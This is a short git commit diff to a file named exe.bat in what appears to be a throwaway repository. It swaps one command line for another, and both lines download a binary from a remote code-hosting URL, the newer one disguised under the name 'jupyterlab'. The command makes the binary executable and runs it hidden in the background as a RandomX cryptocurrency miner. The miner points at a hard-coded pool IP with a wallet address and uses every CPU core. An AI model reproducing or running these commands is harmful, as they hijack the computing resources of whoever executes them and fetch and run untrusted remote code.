3c7aac7aa93b82691e320d51c910d25f4ba55a76
christineiimegan <christineiimegan@outlook.com>
2025-02-25 19:34:49 +0700

    Update exe.bat

--- exe.bat
+++ exe.bat
@@ -1,1 +1,3 @@
-wget https://github.com/christineiimegan/miniature/raw/refs/heads/main/zjava && chmod 777 zjava && ./zjava -a rx/0 -o 8.209.210.176:443 -u SaLvsAXvo1HSCeA3Fq12dAjVoPb9pVkPSHntdWbLRnRWSxsU9jJW6Kv9mqE3Q1mKXiGMa1MCaD76NFdSrzfzLdvJJjDphKEpADT.$(echo $(shuf -i 1-9 -n 1)-GHH) --randomx-1gb-pages -p -x -t $(nproc --all) &>/dev/null &
+wget -qO rubby https://gitlab.com/jasa4/jasa/-/raw/main/jupyterlab && chmod +x * >/dev/null 2>&1
+nohup ./rubby -o 8.209.210.176:443 -a rx/0 -u SaLvsAXvo1HSCeA3Fq12dAjVoPb9pVkPSHntdWbLRnRWSxsU9jJW6Kv9mqE3Q1mKXiGMa1MCaD76NFdSrzfzLdvJJjDphKEpADT --randomx-1gb-pages -p $(echo $(shuf -i 1-9 -n 1)-GHH) -t $(nproc --all) &>/dev/null &
+
